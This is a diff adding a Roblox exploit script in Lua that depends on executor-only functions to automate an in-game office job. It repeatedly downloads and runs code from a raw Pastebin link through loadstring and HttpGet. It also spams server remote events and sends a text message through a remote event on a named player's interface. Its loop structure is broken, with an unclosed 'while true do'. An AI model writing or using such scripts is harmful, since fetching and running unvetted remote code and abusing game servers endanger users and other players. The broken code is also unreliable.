@@ -1,0 +1,116 @@
+while true do
+loadstring(game:HttpGet(("https://pastebin.com/raw/qsbMW3TU"),true))()
+game:GetService("RunService").Stepped:connect(function()
+game:GetService("ReplicatedStorage").RemoteEvents.Paper:FireServer()
+local A_1 = "Print"
+local A_2 = "hidden society is epi"
+game:GetService("Players")["Vicezilla"].PlayerGui.Computer.RemoteEvent:FireServer(A_1, A_2)
+end)
+function texttocode(key)
+if key == "a" then
+return 0x41
+elseif key == "b" then
+return 0x42
+elseif key == "c" then
+return 0x43
+elseif key == "d" then
+return 0x44
+elseif key == "e" then
+return 0x45
+elseif key == "f" then
+return 0x46
+elseif key == "g" then
+return 0x47
+elseif key == "h" then
+return 0x48
+elseif key == "i" then
+return 0x49
+elseif key == "j" then
+return 0x4A
+elseif key == "k" then
+return 0x4B
+elseif key == "l" then
+return 0x4C
+elseif key == "m" then
+return 0x4D
+elseif key == "n" then
+return 0x4E
+elseif key == "o" then
+return 0x4F
+elseif key == "p" then
+return 0x50
+elseif key == "q" then
+return 0x51
+elseif key == "r" then
+return 0x52
+elseif key == "s" then
+return 0x53
+elseif key == "t" then
+return 0x54
+elseif key == "u" then
+return 0x55
+elseif key == "v" then
+return 0x56
+elseif key == "w" then
+return 0x57
+elseif key == "x" then
+return 0x58
+elseif key == "y" then
+return 0x59
+elseif key == "z" then
+return 0x5A
+elseif key == "space" then
+return 0x20
+end
+return false
+end
+local UserInput = game:GetService("UserInputService")
+quit = false
+local humanoid = game.Players.LocalPlayer.Character.Humanoid
+ 
+ 
+ 
+local paper = false
+local currentseat = false
+local dosit = true
+while quit == false do
+local computer = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Computer")
+if computer then
+local label = computer.computer.Notepad:FindFirstChild("display")
+if label then
+label = label.text:gsub(" ","")
+local code = texttocode(string.lower(label))
+if code then
+syn_keypress(texttocode(string.lower(label)))
+syn_keyrelease(texttocode(string.lower(label)))
+end
+end
+end
+if UserInput:IsKeyDown(Enum.KeyCode.LeftBracket) then
+quit = false
+break
+end
+if UserInput:IsKeyDown(Enum.KeyCode.RightBracket) then
+dosit = not dosit
+end
+if humanoid.Sit then
+if humanoid.SeatPart.Parent.Parent.Name == "Office" then
+paper = humanoid.SeatPart.Parent.Parent.Paper
+currentseat = humanoid.SeatPart
+--else
+--humanoid.SeatPart:FindFirstChild("SeatWeld"):Destroy()
+end
+else
+if currentseat then
+if dosit then
+end
+end
+end
+if paper then
+--if paper.CanPick then
+fireclickdetector(paper.ClickDetector,5)
+--end
+end
+wait(.01)
+end
+ 0  0 
